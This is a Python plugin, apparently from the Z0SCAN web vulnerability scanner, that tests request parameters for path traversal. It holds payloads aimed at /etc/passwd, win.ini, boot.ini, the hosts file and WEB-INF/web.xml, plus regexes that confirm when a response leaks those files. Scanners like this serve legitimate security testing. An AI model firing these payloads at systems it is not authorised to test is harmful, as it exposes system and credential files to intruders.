#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/8
# JiuZero 2025/3/30

import copy
import re
from urllib.parse import unquote, quote
from lib.core.log import logger
from concurrent.futures import ThreadPoolExecutor, as_completed
from api import generateResponse, updateJsonObjectFromStr, conf, KB, PLACE, OS, WEB_PLATFORM, VulType, POST_HINT, ResultObject, PluginBase, Type
from lib.core.settings import DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER


class Z0SCAN(PluginBase):
    name = "PathTrave"
    desc = 'Path Traversal'

    def condition(self):
        if not self.response.waf:
            return True
        return False
    
    def generate_payloads(self):
        payloads = []
        default_extension = ".jpg"
        payloads.append("../../../../../../../../../../../etc/passwd%00")
        payloads.append("/etc/passwd")
        if OS.LINUX in self.response.os or OS.DARWIN in self.response.os:
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
        if OS.WINDOWS in self.response.os:
            payloads.append("../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\boot.ini")
            # if origin:
            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
        if WEB_PLATFORM.JAVA in self.response.programing:
            payloads.append("/WEB-INF/web.xml")
            payloads.append("../../WEB-INF/web.xml")
        return payloads

    def audit(self):
        if not self.condition():
            return
        plainArray = [
            r"; for 16-bit app support",
            r"[MCI Extensions.BAK]",
            r"# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
            r"# localhost name resolution is handled within DNS itself.",
            r"[boot loader]"
        ]

        regexArray = [
            r'(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            r'(root:\w:\d*:)',
            r"System\.IO\.FileNotFoundException: Could not find file\s'\w:",
            r"System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
            r"<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
            r"(<web-app[\s\S]+<\/web-app>)",
            r"Warning: fopen\(",
            r"open_basedir restriction in effect",
            r'/bin/(bash|sh)[^\r\n<>]*[\r\n]',
            r'\[boot loader\][^\r\n<>]*[\r\n]'
        ]
        iterdatas = self.generateItemdatas()
        payloads = self.generate_payloads()
        with ThreadPoolExecutor(max_workers=None) as executor:
            futures = [
                executor.submit(self.process, _, payloads, plainArray, regexArray) for _ in iterdatas
            ]
            try:
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as task_e:
                        logger.error(f"Task failed: {task_e}", origin="PathTrave")
                        raise
            except KeyboardInterrupt:
                executor.shutdown(wait=False)
            except Exception as e:
                logger.error(f"Unexpected error: {e}", origin="PathTrave")
                executor.shutdown(wait=False)
                
    def process(self, _, payloads, plainArray, regexArray):
        k, v, position = _
        for _payload in payloads:
            payload = self.insertPayload(k, v, position, _payload)
            r = self.req(position, payload)
            if not r:
                continue
            html1 = r.text
            for plain in plainArray:
                if plain in html1:
                    result = ResultObject(self)
                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, plain))
                    self.success(result)
                    return
            for regex in regexArray:
                if re.search(regex, html1, re.I | re.S | re.M):
                    result = ResultObject(self)
                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, regex))
                    self.success(result)
                    return
